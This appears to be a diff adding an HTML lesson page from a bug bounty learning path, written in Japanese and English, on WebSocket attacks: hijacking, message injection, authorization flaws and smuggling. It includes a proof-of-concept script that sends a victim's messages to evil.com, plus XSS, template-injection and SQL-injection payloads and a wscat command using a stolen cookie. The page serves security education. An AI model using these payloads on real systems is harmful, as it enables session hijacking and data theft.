@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebSocket & Real-time Attacks - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 4: Advanced &gt; WebSocket &amp; Real-time Attacks
+        </div>
+
+        <div class="page-header">
+            <h1>WebSocket & Real-time Attacks</h1>
+            <p class="subtitle">
+                WebSocket接続のハンドシェイク、メッセージング、認可モデルの脆弱性を攻撃。
+                Cross-Site WebSocket Hijacking (CSWSH)やper-message authorization欠如が狙い目。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>WebSocket Fundamentals</h2>
+
+            <h3>Handshake Process</h3>
+            <pre><code>// Client → Server (HTTP Upgrade request)
+GET /ws/chat HTTP/1.1
+Host: app.example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://app.example.com
+Cookie: session=abc123
+
+// Server → Client (101 Switching Protocols)
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</code></pre>
+
+            <h3>Security-relevant headers</h3>
+            <table>
+                <thead>
+                    <tr><th>Header</th><th>Purpose</th><th>Security Impact</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>Origin</code></td><td>接続元オリジン</td><td>CSWSH防止 (要検証)</td></tr>
+                    <tr><td><code>Cookie</code></td><td>認証情報</td><td>自動送信 → CSWSH に利用される</td></tr>
+                    <tr><td><code>Sec-WebSocket-Key</code></td><td>Handshake integrity</td><td>セキュリティ目的ではない (cache防止)</td></tr>
+                    <tr><td><code>Sec-WebSocket-Protocol</code></td><td>サブプロトコル指定</td><td>認証トークンの送信に悪用されることも</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout warning">
+                <div class="callout-title">重要: Sec-WebSocket-Key はセキュリティではない</div>
+                <p>
+                    この値はランダムに見えるが、プロキシのキャッシュ防止が目的。
+                    CSRF保護にはならない。Origin検証が唯一のCSWSH対策。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Attack 1: Cross-Site WebSocket Hijacking (CSWSH)</h2>
+
+            <h3>Concept</h3>
+            <p>
+                WebSocket handshakeはHTTP requestなので、Cookieが自動付与される。
+                サーバがOriginヘッダーを検証しない場合、攻撃者サイトからvictimの認証付きWebSocket接続を確立できる。
+            </p>
+
+            <h3>Attack PoC</h3>
+            <pre><code>&lt;!-- attacker's page: evil.com/exploit.html --&gt;
+&lt;script&gt;
+  // Victim visits this page while logged into target.com
+  var ws = new WebSocket('wss://target.com/ws/notifications');
+
+  ws.onopen = function() {
+    // Authenticated as victim (cookie sent automatically)
+    ws.send(JSON.stringify({action: "get_private_messages"}));
+  };
+
+  ws.onmessage = function(event) {
+    // Exfiltrate data to attacker
+    fetch('https://evil.com/collect?data=' + btoa(event.data));
+  };
+&lt;/script&gt;</code></pre>
+
+            <h3>Conditions for CSWSH</h3>
+            <ul>
+                <li>認証がCookie-basedである (Bearer tokenを別途送る場合は攻撃不可)</li>
+                <li>Origin headerが検証されていない</li>
+                <li>SameSite=None or Cookie属性未設定 (Chrome default: Lax → 一部bypass可)</li>
+            </ul>
+
+            <h3>SameSite Cookie との関係</h3>
+            <table>
+                <thead>
+                    <tr><th>SameSite</th><th>WebSocket handshakeでCookie送信</th><th>CSWSH可能?</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>None</td><td>送信される</td><td>Yes</td></tr>
+                    <tr><td>Lax</td><td>ブラウザ依存 (Chrome最新版では不送信の場合あり)</td><td>要テスト (ブラウザ/バージョンで異なる)</td></tr>
+                    <tr><td>Strict</td><td>送信されない</td><td>No</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout danger">
+                <div class="callout-title">SameSite=Lax でも CSWSH は可能</div>
+                <p>
+                    WebSocket接続はブラウザによっては「top-level navigation」と同等に扱われ、
+                    SameSite=LaxのCookieが送信される。Strict以外は油断禁物。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Attack 2: Message Tampering & Injection</h2>
+
+            <h3>Scenario</h3>
+            <p>WebSocket経由のチャットメッセージにHTMLタグやscriptを注入:</p>
+            <pre><code>// Normal message
+{"type": "chat", "body": "Hello!"}
+
+// Injected payload
+{"type": "chat", "body": "&lt;img src=x onerror=alert(document.cookie)&gt;"}
+
+// If rendered without sanitization → Stored XSS via WebSocket</code></pre>
+
+            <h3>Server-side Injection</h3>
+            <pre><code>// WebSocket message processed by server-side template
+{"type": "render", "template": "{{constructor.constructor('return this')()}}"}
+
+// Or SQL injection via WebSocket
+{"type": "search", "query": "' UNION SELECT password FROM users--"}</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Attack 3: Authorization Flaws</h2>
+
+            <h3>Connection-level only auth</h3>
+            <p>よくある実装パターン: 接続時のみ認証チェックし、以降のメッセージでは検証しない。</p>
+            <pre><code>// Connection: authenticated as user_id=123
+// After connection established:
+ws.send(JSON.stringify({
+  action: "read_messages",
+  channel: "private_channel_admin_only"
+}));
+// Server doesn't re-check: is user_id=123 allowed in this channel?
+// → Returns admin-only messages</code></pre>
+
+            <h3>Channel Enumeration</h3>
+            <pre><code>// Subscribe to other users' notification channels
+for (let i = 1; i <= 1000; i++) {
+  ws.send(JSON.stringify({
+    action: "subscribe",
+    channel: `user_${i}_notifications`
+  }));
+}
+// If no per-subscribe authorization → receive all users' notifications</code></pre>
+
+            <h3>Privilege Escalation via Message Type</h3>
+            <pre><code>// Normal user sends admin-only message type
+ws.send(JSON.stringify({
+  type: "admin_broadcast",
+  message: "System maintenance in 5 minutes"
+}));
+// If message type isn't validated against user role → broadcast succeeds</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Attack 4: WebSocket Smuggling</h2>
+            <p>
+                Reverse proxy (Nginx, HAProxy) がWebSocket upgradeを処理する際、
+                後続のデータをHTTPとして再解釈させるsmuggling攻撃:
+            </p>
+            <pre><code>// After WebSocket upgrade, send HTTP-like data on the raw TCP connection
+// If proxy doesn't properly handle the upgraded connection:
+// Raw bytes interpreted as new HTTP request by backend
+
+GET /admin HTTP/1.1
+Host: internal-service
+X-Forwarded-For: 127.0.0.1</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Testing Methodology</h2>
+
+            <h3>Step 1: Identify WebSocket Endpoints</h3>
+            <ul>
+                <li>Burp Suite → WebSockets history tab</li>
+                <li>Browser DevTools → Network → WS filter</li>
+                <li>JS source内の <code>new WebSocket(</code> を検索</li>
+            </ul>
+
+            <h3>Step 2: Analyze Handshake</h3>
+            <ul>
+                <li>Origin headerの検証有無 (異なるOriginで接続試行)</li>
+                <li>認証方式 (Cookie vs Token in protocol header)</li>
+                <li>CORS-like制御の有無</li>
+            </ul>
+
+            <h3>Step 3: Message Analysis</h3>
+            <ul>
+                <li>全メッセージタイプの列挙</li>
+                <li>各メッセージの必須パラメータ特定</li>
+                <li>他ユーザIDやチャンネルIDへのアクセス試行</li>
+            </ul>
+
+            <h3>Tools</h3>
+            <table>
+                <thead>
+                    <tr><th>Tool</th><th>用途</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Burp Suite (WebSocket tab)</td><td>Intercept & modify messages</td></tr>
+                    <tr><td>wscat</td><td>CLI WebSocket client</td></tr>
+                    <tr><td>websocat</td><td>Advanced CLI tool (pipe support)</td></tr>
+                    <tr><td>Browser DevTools</td><td>Message inspection & replay</td></tr>
+                    <tr><td>WSSiP</td><td>WebSocket manipulation proxy</td></tr>
+                </tbody>
+            </table>
+
+            <h3>wscat Example</h3>
+            <pre><code># Connect with custom headers
+wscat -c "wss://target.com/ws" \
+  -H "Cookie: session=stolen_value" \
+  -H "Origin: https://evil.com"
+
+# If connection succeeds with evil.com origin → CSWSH possible</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Common Vulnerable Patterns</h2>
+            <div class="card">
+                <div class="card-title">狙い目のアプリケーション</div>
+                <ul>
+                    <li><strong>リアルタイムチャット</strong>: Slack-like, customer support widgets</li>
+                    <li><strong>通知システム</strong>: Push notifications via WebSocket</li>
+                    <li><strong>コラボレーションツール</strong>: Real-time document editing</li>
+                    <li><strong>ゲーム</strong>: Multiplayer game state synchronization</li>
+                    <li><strong>ダッシュボード</strong>: Real-time metrics/monitoring</li>
+                    <li><strong>トレーディング</strong>: Price feeds, order updates</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="page-nav">
+            <a href="42-oauth-attacks.html">&larr; Prev: OAuth Attacks</a>
+            <a href="44-graphql.html">Next: GraphQL Security &rarr;</a>
+        </div>
+
+        <div style="margin-top:2rem; text-align:center;">
+            <button class="complete-btn" data-module-id="43-ws" onclick="toggleComplete('43-ws')">Mark Complete</button>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
